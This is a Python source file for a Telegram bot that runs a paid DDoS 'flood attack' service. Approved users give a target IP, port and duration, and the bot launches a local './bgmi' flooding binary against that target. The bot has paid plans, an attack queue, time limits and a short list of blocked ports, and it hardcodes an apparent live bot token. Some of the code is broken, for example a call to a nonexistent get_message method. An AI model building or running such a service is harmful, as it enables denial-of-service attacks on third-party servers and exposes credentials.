import os
import telebot
import logging
import time
from datetime import datetime, timedelta
import random
from threading import Thread
import asyncio
import subprocess
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Initialize asyncio event loop
loop = asyncio.new_event_loop()

TOKEN = '7252565213:AAFdpUYiZnWPEEJzrMWy-S6zUWFzlWmSzAM'

FORWARD_CHANNEL_ID = -1002476114422
CHANNEL_ID = -1002476114422
error_channel_id = -1002476114422

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

# In-memory user data storage
approved_users = {}
cooldown_users = {}  # Tracks cooldown for non-admin users
attack_queue = []  # Queue of users waiting for attack
attack_running = False  # Track if an attack is currently running
attack_remaining_time = 0  # Remaining time of the current attack

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list
MAX_ATTACK_TIME = 180  # Maximum attack duration in seconds
COOLDOWN_TIME = 300  # Cooldown time in seconds for non-admin users

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    global attack_running, attack_remaining_time

    attack_running = True
    attack_remaining_time = duration
    for remaining in range(duration, 0, -1):
        await asyncio.sleep(1)  # Simulate attack
        attack_remaining_time = remaining
        notify_waiting_users(remaining)

    attack_running = False
    attack_remaining_time = 0
    notify_waiting_users(remaining)  # Notify users that attack has completed
    process_next_user_in_queue()

def notify_waiting_users(remaining_time):
    """Notify all waiting users about the remaining attack time."""
    for user_id in attack_queue:
        bot.send_message(user_id, f"*The current attack is running. Please wait... Remaining time: {remaining_time} seconds.*", parse_mode='Markdown')

def process_next_user_in_queue():
    """Process the next user in the queue."""
    if attack_queue:
        next_user_id = attack_queue.pop(0)
        bot.send_message(next_user_id, "*You can now proceed with the attack. Please enter target details.*", parse_mode='Markdown')
        attack_command(bot.get_message(next_user_id))

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])

    if action == '/approve':
        plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
        days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
        valid_until = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d") if days > 0 else "Unlimited"

        # Store user details in memory
        approved_users[target_user_id] = {
            "plan": plan,
            "valid_until": valid_until
        }

        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days (valid until: {valid_until}).*"
    else:  # disapprove
        approved_users.pop(target_user_id, None)  # Remove user from approved list
        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        if user_id not in approved_users:
            bot.send_message(chat_id, "*You are not approved to use this bot. Please contact @legacy4real0*", parse_mode='Markdown')
            return

        # If an attack is already running, put user in queue
        if attack_running:
            attack_queue.append(user_id)
            bot.send_message(chat_id, "*An attack is currently running. You have been added to the queue. Please wait your turn.*", parse_mode='Markdown')
            return

        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    user_id = message.from_user.id
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Please use: /Attack target_ip target_port time*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        # Enforce blocked ports
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        # Enforce max attack time
        if duration > MAX_ATTACK_TIME:
            bot.send_message(message.chat.id, f"*Duration too long. Limiting attack to {MAX_ATTACK_TIME} seconds.*", parse_mode='Markdown')
            duration = MAX_ATTACK_TIME

        # Run the bgmi binary with subprocess
        attack_command = ['./bgmi', target_ip, str(target_port), str(duration), '20']
        subprocess.Popen(attack_command)  # Run the command asynchronously

        bot.send_message(message.chat.id, f"*FLOODING Started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration} seconds*", parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Create a markup object
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)

    # Create buttons
    btn1 = KeyboardButton("FLOOD ATTACK 🕊️")
    btn2 = KeyboardButton("Canary Download⏬")
    btn3 = KeyboardButton("My Account🏦")
    btn4 = KeyboardButton("Contact admin👑")

    # Add buttons to the markup
    markup.add(btn1, btn2, btn3, btn4)

    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "FLOOD ATTACK 🕊️":
        bot.reply_to(message, "*Ready To Attack a server*", parse_mode='Markdown')
        attack_command(message)
    elif message.text == "Canary Download⏬":
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/legacy4realquery/248*", parse_mode='Markdown')
    elif message.text == "My Account🏦":
        user_id = message.from_user.id
        if user_id in approved_users:
            user_data = approved_users[user_id]
            response = (f"*Account Information*\n"
                        f"Plan: {user_data['plan']}\n"
                        f"Valid Until: {user_data['valid_until']}")
        else:
            response = "*No account information found. Please contact @legacy4real0.*"
        bot.reply_to(message, response, parse_mode='Markdown')
    elif message.text == "Contact admin👑":
        bot.reply_to(message, "*Contact @LEGACY4REAL0\nBOT KE PAPA*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_loop, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)